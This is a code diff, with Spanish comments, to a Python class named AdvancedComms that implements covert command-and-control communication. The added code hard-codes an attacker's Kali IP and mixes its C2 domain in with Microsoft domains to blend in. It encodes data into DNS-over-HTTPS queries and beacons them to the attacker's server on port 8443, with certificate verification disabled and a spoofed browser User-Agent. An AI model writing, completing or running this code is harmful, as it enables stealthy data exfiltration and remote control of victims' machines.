@@ -218,67 +218,77 @@ class AdvancedComms:
     def __init__(self):
         self.session_id = self._generate_anonymous_id()
         self.last_comms = {}
+        # AÑADE ESTA VARIABLE
+        self.kali_ip = "192.168.1.100"  # ← TU IP DE KALI
         self.domains = self._get_legitimate_domains()
-        
-    def _generate_anonymous_id(self):
-        """Genera ID no rastreable"""
-        import uuid
-        # Usar características del hardware pero no únicas
-        random_data = str(random.getrandbits(256)) + str(time.time())
-        return hashlib.sha256(random_data.encode()).hexdigest()[:16]
     
     def _get_legitimate_domains(self):
         """Domains legítimos para blending"""
         return [
+            f'telemetry.{self.kali_ip}',  # ← Dominio para tu C2
             'graph.microsoft.com',
             'login.live.com',
-            'outlook.office365.com',
-            'onedrive.live.com',
-            'store-images.s-microsoft.com'
+            'outlook.office365.com'
         ]
     
     def dns_over_https(self, data):
-        """Comunicación vía DNS-over-HTTPS (DoH)"""
+        """Comunicación vía DNS-over-HTTPS (DoH) - CONECTA A TU C2"""
         try:
             # Codificar datos en subdominio
             encoded_data = base64.urlsafe_b64encode(
                 json.dumps(data).encode()
             ).decode().replace('=', '')
             
-            # Usar proveedor DoH legítimo
+            # USAR TU C2 EN KALI
             doh_providers = [
-                'https://cloudflare-dns.com/dns-query',
-                'https://dns.google/dns-query',
-                'https://mozilla.cloudflare-dns.com/dns-query'
+                f'https://{self.kali_ip}:8443/dns-query',  # ← Solo tu C2
             ]
             
-            domain = random.choice(self.domains)
-            # Construir query que parece legítima
-            query_name = f"{encoded_data[:30]}.telemetry.{domain}"
+            # Usar dominio personalizado
+            domain = f"telemetry.{self.kali_ip}"
+            query_name = f"{encoded_data[:30]}.{domain}"
+            
+            print(f"[*] Sending beacon to C2: {self.kali_ip}:8443")
+            print(f"[*] Encoded data: {encoded_data[:50]}...")
+            
+            # Construir query DNS en formato base64
+            import dns.message
+            import dns.query
+            
+            # Crear mensaje DNS real
+            dns_msg = dns.message.make_query(
+                qname=query_name,
+                rdtype=dns.rdatatype.TXT,
+                rdclass=dns.rdataclass.IN
+            )
+            
+            # Convertir a wire format y codificar en base64
+            wire_data = dns_msg.to_wire()
+            dns_param = base64.urlsafe_b64encode(wire_data).decode().replace('=', '')
             
             # Enviar query DoH
-            params = {
-                'name': query_name,
-                'type': 'TXT',
-                'cd': 'false'
-            }
+            params = {'dns': dns_param}
+            url = f"{doh_providers[0]}?{urllib.parse.urlencode(params)}"
             
-            provider = random.choice(doh_providers)
-            url = f"{provider}?{urllib.parse.urlencode(params)}"
+            # Deshabilitar verificación SSL
+            import ssl
+            context = ssl._create_unverified_context()
             
             headers = {
-                'Accept': 'application/dns-json',
+                'Accept': 'application/dns-message',
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
             }
             
             req = urllib.request.Request(url, headers=headers)
-            response = urllib.request.urlopen(req, timeout=15)
+            response = urllib.request.urlopen(req, timeout=15, context=context)
             
             if response.status == 200:
-                return response.read()
+                response_data = response.read()
+                print(f"[+] C2 responded: {len(response_data)} bytes")
+                return response_data
             
-        except:
-            pass
+        except Exception as e:
+            print(f"[!] Error connecting to C2: {e}")
         return None
     
     def websocket_over_tls(self, endpoint):
